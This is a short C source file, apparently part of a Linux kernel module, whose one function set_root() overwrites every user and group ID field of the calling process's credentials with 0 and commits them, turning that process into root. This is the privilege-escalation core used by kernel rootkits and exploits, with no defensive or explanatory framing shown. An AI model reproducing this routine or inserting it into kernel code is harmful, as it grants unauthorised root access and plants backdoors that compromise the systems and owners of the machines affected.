#include <linux/cred.h>
#include "root.h"

void set_root(void) {
    struct cred *new_cred = prepare_creds();
    if (!new_cred) return;

    new_cred->uid.val = 0;
    new_cred->gid.val = 0;
    new_cred->euid.val = 0;
    new_cred->egid.val = 0;
    new_cred->suid.val = 0;
    new_cred->sgid.val = 0;
    new_cred->fsuid.val = 0;
    new_cred->fsgid.val = 0;

    commit_creds(new_cred);
}